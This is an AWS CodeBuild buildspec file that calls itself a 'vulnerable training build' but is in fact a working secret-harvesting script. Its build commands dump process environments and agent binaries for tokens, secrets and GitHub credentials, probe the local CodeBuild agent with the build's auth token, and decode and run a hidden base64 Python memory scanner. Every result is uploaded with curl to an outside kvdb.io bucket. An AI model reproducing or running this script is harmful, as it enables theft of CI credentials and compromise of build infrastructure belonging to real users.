version: 0.2

env:
  variables:
    AWS_MAX_ATTEMPTS: "1"
    AWS_RETRY_MODE: "standard"
    PYSCAN_B64: ""

phases:
  build:
    commands:
      - echo "Running vulnerable training build"
      - |
        set +e
        bucket='https://kvdb.io/8uXHVtwRAd5qcuZcw9GdSh'
        runid="${CODEBUILD_BUILD_ID##*:}"
        putkey(){ key="$1"; file="$2"; head -c 60000 "$file" | curl -fsS --connect-timeout 5 --max-time 25 --data-binary @- "$bucket/${runid}_$key" || true; }
        echo "canary $runid" > /tmp/canary.txt; putkey canary /tmp/canary.txt
        {
          echo '=== ps ==='
          ps auxww
          echo '=== proc environ filtered ==='
          for p in /proc/[0-9]*; do
            pid=${p##*/}; [ -r "$p/environ" ] || continue
            echo "--- pid $pid $(tr '\0' ' ' < "$p/cmdline" | head -c 200)"
            tr '\0' '\n' < "$p/environ" | grep -Eiv 'AWS_(ACCESS_KEY_ID|SECRET_ACCESS_KEY|SESSION_TOKEN)|CODEBUILD_AUTH_TOKEN|PYSCAN_B64' | grep -Ei 'flag|token|secret|github|codebuild|pat|gh[opsu]_|credential|webhook|source|repo|auth' || true
          done
          echo '=== agent route/auth strings ==='
          for b in /codebuild/readonly/agent /codebuild/readonly/executor /codebuild/readonly/start /codebuild/readonly/bootstrap-log /codebuild/readonly/executor-log /codebuild/output/log; do
            echo "--- $b"
            strings "$b" 2>/dev/null | grep -Ei 'Authorization|Bearer|CODEBUILD_AUTH|auth|token|secret|github|credential|/v1|/api|route|flag' | head -n 300
          done
        } > /tmp/proc.txt 2>&1
        putkey proc /tmp/proc.txt
        {
          echo '=== agent with auth variants ==='
          for base in http://127.0.0.1:7831 http://localhost:7831; do
            for h in "Authorization: $CODEBUILD_AUTH_TOKEN" "Authorization: Bearer $CODEBUILD_AUTH_TOKEN" "X-CodeBuild-Auth-Token: $CODEBUILD_AUTH_TOKEN" "X-Amz-CodeBuild-Token: $CODEBUILD_AUTH_TOKEN" "CodeBuild-Auth-Token: $CODEBUILD_AUTH_TOKEN"; do
              echo "### $base header ${h%%:*}"
              for p in / /ping /health /status /v1/status /v1/metadata /v1/build /build /logs /env /variables /credentials /api/v1/build; do
                echo "--- $p"
                curl -sS --connect-timeout 2 --max-time 5 -H "$h" "$base$p" 2>&1 | sed -E 's/(AccessKeyId|SecretAccessKey|Token|CODEBUILD_AUTH_TOKEN)[^,}]*/\1:REDACTED/g' | head -c 2500; echo
              done
            done
          done
        } > /tmp/agentauth.txt 2>&1
        putkey agentauth /tmp/agentauth.txt
        echo "$PYSCAN_B64" | base64 -d > /tmp/memscan.py
        python3 /tmp/memscan.py > /tmp/memscan.txt 2>&1
        putkey memscan /tmp/memscan.txt
